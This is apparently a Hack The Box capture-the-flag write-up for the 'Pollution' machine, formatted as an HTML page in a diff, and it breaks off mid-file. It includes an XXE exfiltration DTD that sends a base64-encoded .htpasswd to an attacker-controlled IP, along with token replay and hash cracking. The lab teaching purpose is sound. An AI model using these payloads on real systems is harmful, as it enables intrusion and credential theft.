@@ -1,0 +1,3261 @@
+
+  
+    
+    <title>
+      HackTheBox - Pollution (Hard)
+    </title>
+    
+  
+  
+    
+      <header>
+<div class="header"><img src="https://images.unsplash.com/photo-1606994868513-d480e1a1cab0?ixlib=rb-4.0.3&amp;q=85&amp;fm=jpg&amp;crop=entropy&amp;cs=srgb" class="headerImage"/>
+<img class="headerIcon" src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/icon.png"/>
+<h1 class="mainTitle">
+          HackTheBox - Pollution (Hard)
+        </h1 class="mainTitle">
+</div></header>
+      <div class="writeUp">
+        <p id="d02b21c1-6460-4fc9-bef2-fcad590ff0b6">
+          <a href="https://app.hackthebox.com/machines/Pollution">
+            https://app.hackthebox.com/machines/Pollution
+          </a>
+        </p>
+        <h1 id="ed0b1ad6-c43d-426f-b490-08228fd2b22d">
+          Table of content
+        </h1>
+        <nav id="0f667638-1763-469c-b5b5-273c2a145635">
+          <div>
+            <a href="#ed0b1ad6-c43d-426f-b490-08228fd2b22d">
+              Table of content
+            </a>
+          </div>
+          <div>
+            <a href="#b534e7ed-8063-4f20-9c92-42586f6bc612">
+              Enumeration
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#34e9aa9e-a809-459d-bd68-20acac575f67">
+              
+                Nmap scan
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#3187c92d-1891-4c34-9c00-29467f9d527e">
+              
+                Web enumeration
+              
+            </a>
+          </div>
+          <div>
+            <a href="#9d714b52-6ed8-4414-9e95-b4b114cbd07b">
+              Initial access
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#4494e5b5-d593-4951-aa25-a80319cab24e">
+              
+                XXE Injection
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#6162aafc-9919-4164-8185-6fc358ad420e">
+              
+                Hash cracking
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#507e8279-2974-47fd-8f78-fbcaabcbd473">
+              
+                Bypass developers login page
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#70887782-19c2-437f-897f-b6dc01f77463">
+              
+                LFI2RCE
+              
+            </a>
+          </div>
+          <div>
+            <a href="#085e8847-d835-4ab1-b227-0ed5b13c5569">
+              Post-exploitation
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#824d87e2-2b83-4acc-9ec4-ab23597c2ba7">
+              
+                Local enumeration
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#aaab5a89-c113-4914-9356-b89427ac3cde">
+              
+                Privilege escalation
+              
+            </a>
+          </div>
+          <div>
+            <a href="#124c36c7-8def-4eba-9f10-0256e34ef44f">
+              Clearing tracks
+            </a>
+          </div>
+          <div>
+            <a href="#1fc312b1-dc7f-45bd-8b07-78a3a1dc3a08">
+              Vulnerabilities summary
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#82484c7d-7f4b-4a4b-8f0b-26f3717eb515">
+              
+                Sensitive Information Disclosure
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#ac73bb1d-4148-4d11-a317-8689c4737657">
+              
+                XXE Injection
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#78ef7f90-ca48-44b2-af63-9151f871df15">
+              
+                Weak password
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#96957ef9-3ede-47b3-871c-1bf22e20f695">
+              
+                LFI2RCE
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#f8b763c0-61aa-46d5-8bcc-64e4e9e67ecb">
+              
+                PP2RCE
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#442b3a39-0f76-41d1-8a2b-5673cb9f0636">
+              
+                Clear text passwords
+              
+            </a>
+          </div>
+          <div>
+            <a href="#b20c9396-6d33-4d17-bd76-544407fdfd87">
+              Tools used
+            </a>
+          </div>
+          <div>
+            <a href="#c781f86f-f8d3-4a33-a70d-f845f003e2a8">
+              Sources
+            </a>
+          </div>
+        </nav>
+        <h1 id="b534e7ed-8063-4f20-9c92-42586f6bc612">
+          Enumeration
+        </h1>
+        <h2 id="34e9aa9e-a809-459d-bd68-20acac575f67">
+          
+            Nmap scan
+          
+        </h2>
+        
+        
+        
+<pre id="39b5f8a8-bfd2-41c2-87cd-ecdc9f3f7446" class="code"><code># Nmap 7.93 scan initiated Sat May 20 12:30:01 2023 as: nmap -A -p- -oN nmapResults.txt -d 10.129.228.126
+--------------- Timing report ---------------
+  hostgroups: min 1, max 100000
+  rtt-timeouts: init 1000, min 100, max 10000
+  max-scan-delay: TCP 1000, UDP 1000, SCTP 1000
+  parallelism: min 0, max 0
+  max-retries: 10, host-timeout: 0
+  min-rate: 0, max-rate: 0
+---------------------------------------------
+Nmap scan report for 10.129.228.126
+Host is up, received syn-ack (0.044s latency).
+Scanned at 2023-05-20 12:30:01 EDT for 29s
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 db1d5c65729bc64330a52ba0f01ad5fc (RSA)
+|   256 4f7956c5bf20f9f14b9238edcefaac78 (ECDSA)
+|_  256 df47554f4ad178a89dcdf8a02fc0fca9 (ED25519)
+80/tcp   open  http    syn-ack Apache httpd 2.4.54 ((Debian))
+|_http-server-header: Apache/2.4.54 (Debian)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: Home
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+6379/tcp open  redis   syn-ack Redis key-value store
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read from /usr/bin/../share/nmap: nmap-service-probes nmap-services.
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat May 20 12:30:30 2023 -- 1 IP address (1 host up) scanned in 28.52 seconds</code></pre>
+        <h2 id="3187c92d-1891-4c34-9c00-29467f9d527e">
+          
+            Web enumeration
+          
+        </h2>
+        <p id="81167295-e0e7-47f5-ab64-261e98c0f8a0">
+          Let’s see what we can find on port 80 : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Pollution%20(Hard)%20fcda034d930245db84f4df477ce65ca0/Untitled.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/Untitled.png"/>
+          </a>
+        
+        
+          <a href="HackTheBox%20-%20Pollution%20(Hard)%20fcda034d930245db84f4df477ce65ca0/Untitled%201.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/Untitled%201.png"/>
+          </a>
+        
+        
+          <a href="HackTheBox%20-%20Pollution%20(Hard)%20fcda034d930245db84f4df477ce65ca0/Untitled%202.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/Untitled%202.png"/>
+          </a>
+        
+        
+          <a href="HackTheBox%20-%20Pollution%20(Hard)%20fcda034d930245db84f4df477ce65ca0/Untitled%203.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/Untitled%203.png"/>
+          </a>
+        
+        
+          <a href="HackTheBox%20-%20Pollution%20(Hard)%20fcda034d930245db84f4df477ce65ca0/Untitled%204.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/Untitled%204.png"/>
+          </a>
+        
+        <p id="6d2b9f27-266e-42b0-a4b6-9334654333da">
+          There is 4 useful informations here : 
+        </p>
+        <ul id="c4688f1f-98ba-4aa0-8257-d525fe011dcf">
+          <li>
+            We have the domaine name 
+            
+              
+                collect.htb
+              
+            
+          </li>
+        </ul>
+        <ul id="1ed2ef27-ffd4-4a6c-9505-d1f5f9ca5837">
+          <li>
+            We can register
+          </li>
+        </ul>
+        <ul id="0e51ffe9-3089-4e22-9aff-a4b9493253df">
+          <li>
+            We can login
+          </li>
+        </ul>
+        <ul id="ac60f80b-9019-4394-bb49-d97a51d56f42">
+          <li>
+            They are working on a 
+            
+              
+                API
+              
+            
+            , we will try to exploit it later
+          </li>
+        </ul>
+        <p id="9939aac7-8ba2-4a87-bbce-9478dcf4d07b">
+          Let’s add 
+          
+            
+              collect.htb
+            
+          
+           to our 
+          
+            
+              /etc/hosts
+            
+          
+           file : 
+        </p>
+        
+        
+        
+<pre id="afb25b3b-2f37-479e-a725-ae1c6dea2522" class="code"><code>┌──(kali㉿kali)-[~/…/HTB/CTF/Hard/Pollution]
+└─$ cat /etc/hosts     
+127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+
+10.129.228.126  collect.htb</code></pre>
+        <p id="1b3238fb-8bdd-4483-8dab-6b9b0a980fe6">
+          We can try to fuzz virtual hosts with 
+          <a href="https://github.com/OJ/gobuster">
+            
+              Gobuster
+            
+          </a>
+          
+             
+          
+          : 
+        </p>
+        
+        
+        
+<pre id="12b8187a-d59f-4f2e-b6d1-6259da269b1e" class="code"><code>┌──(kali㉿kali)-[~/…/HTB/CTF/Hard/Pollution]
+└─$ gobuster vhost -u http://collect.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://collect.htb/
+[+] Method:          GET
+[+] Threads:         10
+[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+[+] User Agent:      gobuster/3.5
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+2023/05/20 13:08:58 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: forum.collect.htb Status: 200 [Size: 14098]
+Found: developers.collect.htb Status: 401 [Size: 469]
+Progress: 114430 / 114442 (99.99%)
+===============================================================
+2023/05/20 13:17:55 Finished
+===============================================================</code></pre>
+        <p id="3696567d-5e6c-43d5-88e0-b02087b5d084">
+          We found two virtual hosts. The subdomain 
+          
+            
+              developers.collect.htb
+            
+          
+           seems to be protected by a basic HTTP authentication, but 
+          
+            
+              forum.collect.htb
+            
+          
+           is accessible. So, let’s add them to our 
+          
+            
+              /etc/hosts
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="f757edb3-b3cb-4b5d-b27b-67d1946cdad4" class="code"><code>┌──(kali㉿kali)-[~/…/HTB/CTF/Hard/Pollution]
+└─$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+
+10.129.228.126  collect.htb     forum.collect.htb       developers.collect.htb</code></pre>
+        <p id="71f82458-0bf7-4990-b273-9c6e71e3dc9f">
+          Now, let’s see what’s on 
+          
+            
+              forum.collect.htb
+            
+          
+           : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Pollution%20(Hard)%20fcda034d930245db84f4df477ce65ca0/Untitled%205.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/Untitled%205.png"/>
+          </a>
+        
+        <p id="57307044-13d2-4c9c-9596-c7362c96ace0">
+          This is a forum powered by 
+          
+            <a href="https://www.notion.so/HackTheBox-Pollution-Hard-fcda034d930245db84f4df477ce65ca0?pvs=21">
+              MyBB
+            </a>
+          
+          . Fortunately, the installed version of 
+          
+            <a href="https://mybb.com/">
+              MyBB
+            </a>
+          
+           is not vulnerable. By going on 
+          
+            
+              Collect Forum
+            
+          
+          , we can find different threads. Also, we can note the thread authors to create a wordlist of users that could be useful later.
+        </p>
+        <p id="9bd30a5e-db82-445f-a4e3-293ef3abf0c8">
+          The 
+          
+            
+              Pollution API
+            
+          
+           is mentioned 3 times. There is one thread that can be useful for an attacker : 
+          
+            
+              I had problems with the Pollution API
+            
+          
+          . 
+        </p>
+        
+          <a href="HackTheBox%20-%20Pollution%20(Hard)%20fcda034d930245db84f4df477ce65ca0/Untitled%206.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/Untitled%206.png"/>
+          </a>
+        
+        <p id="9672f8bb-5bdb-468a-a6d6-166902d240c6">
+          In this thread, the user 
+          
+            
+              victor
+            
+          
+           shared his 
+          
+            
+              proxy request history
+            
+          
+          . To download it, we need to be logged in. We can simply create an account by going to 
+          
+            
+              <a href="http://forum.collect.htb/member.php">
+                http://forum.collect.htb/member.php
+              </a>
+            
+          
+           like so : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Pollution%20(Hard)%20fcda034d930245db84f4df477ce65ca0/Untitled%207.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/Untitled%207.png"/>
+          </a>
+        
+        <p id="94d97788-4933-4ab3-9b98-f0bee54a313c">
+          After registering, we can download the file. Here is the list of requests made by 
+          
+            
+              victor
+            
+          
+           : 
+        </p>
+        <ul id="73344b82-be8f-432c-bf8b-8ef05219ea58">
+          <li>
+            
+              (GET) 
+            
+            
+              <a href="https://storyset.com/for-figma">
+                https://storyset.com/for-figma
+              </a>
+            
+            
+               ← Out of scope
+            
+          </li>
+        </ul>
+        <ul id="bc4d5055-8895-43ab-b6e7-d3c348d00f1e">
+          <li>
+            
+              
+                (POST) 
+              
+            
+            
+              
+                <a href="http://collect.htb/set/role/admin">
+                  http://collect.htb/set/role/admin
+                </a>
+              
+            
+          </li>
+        </ul>
+        <ul id="d09296e2-35d9-452a-8c8c-47742efee8f0">
+          <li>
+            
+              (GET) 
+            
+            
+              <a href="http://detectportal.firefox.com/canonical.html">
+                http://detectportal.firefox.com/canonical.html
+              </a>
+            
+            
+               ← Out of scope
+            
+          </li>
+        </ul>
+        <ul id="d3410b74-d4ce-4d9f-a8fb-469875e5ff22">
+          <li>
+            (POST) 
+            <a href="http://127.0.0.1:3000/auth/login">
+              http://127.0.0.1:3000/auth/login
+            </a>
+          </li>
+        </ul>
+        <ul id="f50eec12-dfcb-4433-a9a8-0390ec7d0a5f">
+          <li>
+            (GET) 
+            <a href="http://collect.htb/">
+              http://collect.htb/
+            </a>
+          </li>
+        </ul>
+        <ul id="d75f75b1-39b4-46af-8bd6-b192d0b5d7fb">
+          <li>
+            (GET) 
+            <a href="http://forum.collect.htb/forumdisplay.php?fid=2">
+              http://forum.collect.htb/forumdisplay.php?fid=2
+            </a>
+          </li>
+        </ul>
+        <ul id="8e391b47-9750-4b6e-946c-2b38492766f6">
+          <li>
+            (GET) 
+            <a href="http://forum.collect.htb/jscripts/jeditable/jeditable.min.js">
+              http://forum.collect.htb/jscripts/jeditable/jeditable.min.js
+            </a>
+          </li>
+        </ul>
+        <ul id="328c981f-2914-4886-b107-c8288ae67b0a">
+          <li>
+            (GET) 
+            <a href="http://forum.collect.htb/jscripts/inline_edit.js?ver=1821">
+              http://forum.collect.htb/jscripts/inline_edit.js?ver=1821
+            </a>
+          </li>
+        </ul>
+        <ul id="28a8813d-92f2-4b5e-bd4b-2401b35057ad">
+          <li>
+            (GET) 
+            <a href="http://forum.collect.htb/jscripts/rating.js?ver=1821">
+              http://forum.collect.htb/jscripts/rating.js?ver=1821
+            </a>
+          </li>
+        </ul>
+        <p id="0828a746-57cd-4ae6-9a6b-0b0e71fe3a24">
+          One interesting request here is the 
+          
+            
+              POST
+            
+          
+           request sent to 
+          
+            
+              <a href="http://collect.htb/set/role/admin">
+                http://collect.htb/set/role/admin
+              </a>
+            
+          
+          . Let’s decode the 
+          
+            
+              POST
+            
+          
+           data to see what was sent to the webserver : 
+        </p>
+        
+        
+        
+<pre id="7d8a2ff0-d290-4abc-884a-9b2a3595bba3" class="code"><code>┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/loot]
+└─$ base64 -d request_post.txt &gt; response_post.txt
+                                                                                                                             
+┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/loot]
+└─$ cat response_post.txt 
+POST /set/role/admin HTTP/1.1
+Host: collect.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=r8qne20hig1k3li6prgk91t33j
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+
+token=[HIDDEN]</code></pre>
+        <p id="f51995e9-8e63-4af7-bfb9-18217d27f25b">
+          This endpoint seems to set the 
+          
+            
+              admin role
+            
+          
+           for the current user linked to the 
+          
+            
+              PHPSESSID
+            
+          
+           cookie used in the request. We also have the token to do this now. First, we need to create an account on 
+          
+            
+              <a href="http://collect.htb/register">
+                http://collect.htb/register
+              </a>
+            
+          
+           : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Pollution%20(Hard)%20fcda034d930245db84f4df477ce65ca0/Untitled%208.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/Untitled%208.png"/>
+          </a>
+        
+        <p id="eba3035b-8d64-4fc3-a236-6fb243a44140">
+          After this, we can login. Now let’s use 
+          <a href="https://portswigger.net/burp">
+            
+              BurpSuite
+            
+          </a>
+           to send a 
+          
+            
+              POST
+            
+          
+           request to 
+          
+            
+              <a href="http://collect.htb/set/role/admin">
+                http://collect.htb/set/role/admin
+              </a>
+            
+          
+           using the token we found : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Pollution%20(Hard)%20fcda034d930245db84f4df477ce65ca0/Untitled%209.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/Untitled%209.png"/>
+          </a>
+        
+        <p id="0e88e8a2-c74f-40f5-93ad-03b4784759ee">
+          After sending this request, we can access 
+          
+            
+              <a href="http://collect.htb/admin">
+                http://collect.htb/admin
+              </a>
+            
+          
+           :
+        </p>
+        
+          <a href="HackTheBox%20-%20Pollution%20(Hard)%20fcda034d930245db84f4df477ce65ca0/Untitled%2010.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/Untitled%2010.png"/>
+          </a>
+        
+        
+          <a href="HackTheBox%20-%20Pollution%20(Hard)%20fcda034d930245db84f4df477ce65ca0/Untitled%2011.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/Untitled%2011.png"/>
+          </a>
+        
+        <p id="7c4288c3-38a3-4375-b818-8cf853a2ca7b">
+          So now, we can register a new user to the 
+          
+            
+              Pollution API
+            
+          
+          . 
+        </p>
+        <h1 id="9d714b52-6ed8-4414-9e95-b4b114cbd07b">
+          Initial access
+        </h1>
+        <h2 id="4494e5b5-d593-4951-aa25-a80319cab24e">
+          
+            XXE Injection
+          
+        </h2>
+        <p id="2f7d6f0f-c0f4-40aa-b2c8-39ae6b8323e9">
+          When looking at the 
+          
+            
+              POST
+            
+          
+           request sent to the 
+          
+            
+              API
+            
+          
+           when registering a new user, we can see 
+          
+            
+              XML data
+            
+          
+           being send. Maybe it is vulnerable to 
+          
+            
+              XXE (XML External Entity) injections
+            
+          
+           ?
+        </p>
+        <p id="1b91f37b-c668-4fff-af76-1f3ebe9f86bd">
+          When sending this request : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Pollution%20(Hard)%20fcda034d930245db84f4df477ce65ca0/Untitled%2012.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/Untitled%2012.png"/>
+          </a>
+        
+        <p id="6a874829-15d9-431d-9a7c-66a7aebdece9">
+          We have this response from the webserver : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Pollution%20(Hard)%20fcda034d930245db84f4df477ce65ca0/Untitled%2013.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/Untitled%2013.png"/>
+          </a>
+        
+        <p id="89db8284-1de7-46f6-a406-aef35fe4c1e8">
+          Since any of the data send via XML is returned, we will need to exploit a 
+          
+            
+              Blind XXE injection
+            
+          
+          . First, let’s write a 
+          
+            
+              malicious dtd file
+            
+          
+           on our attacking host : 
+        </p>
+        
+        
+        
+<pre id="56b60ec9-5e6b-4b24-aebb-4d521b563499" class="code"><code>┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ cat exploit.dtd
+&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/developers/.htpasswd&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;http://10.10.16.17/?x=%file;&#x27;&gt;&quot;&gt;
+%eval;
+%exfiltrate;</code></pre>
+        <p id="508b36a7-eef9-4caa-8376-bb084cd639d5">
+          This malicious file will make the target host send a request to our web server containing the content of 
+          
+            
+              /var/www/developers/.htpasswd
+            
+          
+           file encoded in base64. Now let’s run a simple web server using python : 
+        </p>
+        
+        
+        
+<pre id="430e03ad-cabb-4a4e-8e52-c99df3eae0b4" class="code"><code>┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ python3 -m http.server 80 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre>
+        <p id="c136767d-baea-4aa3-8661-ac28ea91a06e">
+          Finally, let’s exploit the 
+          
+            
+              XXE injection
+            
+          
+           using 
+          
+            <a href="https://portswigger.net/burp">
+              BurpSuite
+            </a>
+          
+           : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Pollution%20(Hard)%20fcda034d930245db84f4df477ce65ca0/Untitled%2014.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/Untitled%2014.png"/>
+          </a>
+        
+        <p id="1c092dbb-0295-44ff-82ca-47a9260ee454">
+          After sending this request, let’s take a look at our python web server : 
+        </p>
+        
+        
+        
+<pre id="5a32dcf8-a5b5-4cf1-9131-e8fad2c8072d" class="code"><code>┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.228.126 - - [20/May/2023 14:51:10] &quot;GET /exploit.dtd HTTP/1.1&quot; 200 -
+10.129.228.126 - - [20/May/2023 14:51:10] &quot;GET /?x=ZGV2ZWxvcGVyc1[HIDDEN] HTTP/1.1&quot; 200 -</code></pre>
+        <p id="1b6cd03a-7243-4674-97e1-95855da55a23">
+          We successfully retrieved the data from 
+          
+            
+              /var/www/developers/.htpasswd
+            
+          
+          . Let’s decode it : 
+        </p>
+        
+        
+        
+<pre id="34723984-4b14-44d8-9fcf-955c6897fd3f" class="code"><code>┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ echo &#x27;ZGV2ZWxvcGVyc1[HIDDEN]&#x27; | base64 -d
+developers_group:[HIDDEN]</code></pre>
+        <h2 id="6162aafc-9919-4164-8185-6fc358ad420e">
+          
+            Hash cracking
+          
+        </h2>
+        <p id="103c5797-cc09-4ee3-9bef-25c84b015cdb">
+          So we have the username and password hash to login on 
+          <a href="http://developers.collect.htb/">
+            
+              
+                http://developers.collect.htb/
+              
+            
+          </a>
+          . Let’s crack this hash using 
+          <a href="https://www.openwall.com/john/">
+            
+              john
+            
+          </a>
+           and 
+          
+            
+              rockyou.txt
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="17694683-7ca2-4ccf-9a7a-9c07eead1cd2" class="code"><code>┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
+Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
+Will run 4 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+[HIDDEN]           (developers_group)     
+1g 0:00:00:01 DONE (2023-05-20 14:57) 0.7407g/s 158577p/s 158577c/s 158577C/s rasfatata..puppyluver
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</code></pre>
+        <p id="823654e3-e018-4817-a310-386c80150c12">
+          We can now login on 
+          <a href="http://developers.collect.htb/">
+            
+              
+                http://developers.collect.htb/
+              
+            
+          </a>
+          
+            
+              .
+            
+          
+           
+        </p>
+        <h2 id="507e8279-2974-47fd-8f78-fbcaabcbd473">
+          
+            Bypass developers login page
+          
+        </h2>
+        <p id="928a7ab4-64b0-4042-aea6-58906a8acc8a">
+          After passing the basic authentication, we are redirected to another login page : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Pollution%20(Hard)%20fcda034d930245db84f4df477ce65ca0/Untitled%2015.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/Untitled%2015.png"/>
+          </a>
+        
+        <p id="8e4fc189-a7c3-4f39-85a9-1c2313f97af0">
+          The credentials for basic authentication will not work on this login page. Since we don’t have any valid credentials for this login page, we will need to look somewhere else…
+        </p>
+        <p id="d221032d-191e-4cf0-8c0b-1d51f7e417ba">
+          Remember, there was a 
+          
+            <a href="https://redis.io/">
+              Redis
+            </a>
+          
+           database running on port 
+          
+            
+              6379
+            
+          
+          . Maybe we can find something interesting in it ?
+        </p>
+        
+        
+        
+<pre id="4b5d88c2-f1ff-4f7a-aa2b-9030982de2ad" class="code"><code>┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ redis-cli -h 10.129.228.126
+10.129.228.126:6379&gt; 
+10.129.228.126:6379&gt; INFO
+NOAUTH Authentication required.</code></pre>
+        <p id="fd1363f5-b928-4c21-84d1-4531e09828a8">
+          We need to authenticate. We don’t have any valid credentials for 
+          
+            <a href="https://redis.io/">
+              Redis
+            </a>
+          
+           too. We may be able to find them in a file by exploiting the 
+          
+            
+              XXE injection vulnerability
+            
+          
+           we found earlier. Let’s see what’s in 
+          
+            
+              /var/www/developers/index.php
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="2d92a3e4-62a2-4e34-8fe5-86147ba1c522" class="code"><code>┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ echo &#x27;PD9waHANCnJlcXVpcmUgJy4vYm9vdHN0cmFwLnBocCc7DQoNCg0KaWYgKCFpc3NldCgkX1NFU1NJT05bJ2F1dGgnXSkgb3IgJF9TRVNTSU9OWydhdXRoJ10gIT0gVHJ1ZSkgew0KICAgIGRpZShoZWFkZXIoJ0xvY2F0aW9uOiAvbG9naW4ucGhwJykpOw0KfQ0KDQppZiAoIWlzc2V0KCRfR0VUWydwYWdlJ10pIG9yIGVtcHR5KCRfR0VUWydwYWdlJ10pKSB7DQogICAgZGllKGhlYWRlcignTG9jYXRpb246IC8/cGFnZT1ob21lJykpOw0KfQ0KDQokdmlldyA9IDE7DQoNCj8+DQoNCjwhRE9DVFlQRSBodG1sPg0KPGh0bWwgbGFuZz0iZW4iPg0KDQo8aGVhZD4NCiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+DQogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIj4NCiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+DQogICAgPHNjcmlwdCBzcmM9ImFzc2V0cy9qcy90YWlsd2luZC5qcyI+PC9zY3JpcHQ+DQogICAgPHRpdGxlPkRldmVsb3BlcnMgQ29sbGVjdDwvdGl0bGU+DQo8L2hlYWQ+DQoNCjxib2R5Pg0KICAgIDxkaXYgY2xhc3M9ImZsZXggZmxleC1jb2wgaC1zY3JlZW4ganVzdGlmeS1iZXR3ZWVuIj4NCiAgICAgICAgPD9waHAgaW5jbHVkZSgiaGVhZGVyLnBocCIpOyA/Pg0KICAgICAgICANCiAgICAgICAgPG1haW4gY2xhc3M9Im1iLWF1dG8gbXgtMjQiPg0KICAgICAgICAgICAgPD9waHAgaW5jbHVkZSgkX0dFVFsncGFnZSddIC4gIi5waHAiKTsgPz4NCiAgICAgICAgPC9tYWluPg0KDQogICAgICAgIDw/cGhwIGluY2x1ZGUoImZvb3Rlci5waHAiKTsgPz4NCiAgICA8L2Rpdj4NCg0KPC9ib2R5Pg0KDQo8L2h0bWw+&#x27; | base64 -d
+&lt;?php
+require &#x27;./bootstrap.php&#x27;;
+
+
+if (!isset($_SESSION[&#x27;auth&#x27;]) or $_SESSION[&#x27;auth&#x27;] != True) {
+    die(header(&#x27;Location: /login.php&#x27;));
+}
+
+if (!isset($_GET[&#x27;page&#x27;]) or empty($_GET[&#x27;page&#x27;])) {
+    die(header(&#x27;Location: /?page=home&#x27;));
+}
+
+$view = 1;
+
+?&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
